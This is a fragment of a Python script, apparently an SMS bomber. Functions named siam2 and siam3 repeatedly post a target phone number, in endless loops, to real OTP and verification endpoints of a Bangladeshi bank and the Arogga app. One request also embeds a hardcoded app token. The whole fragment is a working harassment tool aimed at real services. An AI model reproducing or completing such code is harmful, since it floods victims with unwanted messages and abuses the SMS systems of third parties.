...
def siam2(number):
    try:
        while True:
            url_siam1 = "https://ibanking.uttarabank-bd.com/verifidext/api/CustOnBoarding/VerifyMobileNumber"
            headers_siam1 = {"Content-Type" : "application/json"}
            data_siam1 = '{"AccessToken":"","TrackingNo":"","mobileNo":"'+ number +'","otpSms":"","product_id":"111","requestChannel":"MOB","trackingStatus":5}'
            requ_siam1 = requests.post(url_siam1, headers=headers_siam1, data=data_siam1)
...
def siam3(number):
    try:
        while True:
            url_siam2 = "https://api.arogga.com/v1/auth/sms/send?f=app&v=5.0.4&os=android&osv=23"
            headers_siam2 = {'Content-Type': 'application/x-www-form-urlencoded'}
            data_siam2 = 'mobile=' + number + '&fcmToken=cXq7e97WRwOuQX8XhVhlki%253AAPA91bEzBAc1c502C0VfVmevconD7Tj55kXalhB6PZI8L7wDqua6mPKrwmMpczPXbDGucL6xUZsAlrnQluFpWbHNp9FnLaw9q0mWA2X0-vhWHRTsP1VfLGWJm_t3ZUzlXIBJ728wg_wA&referral='
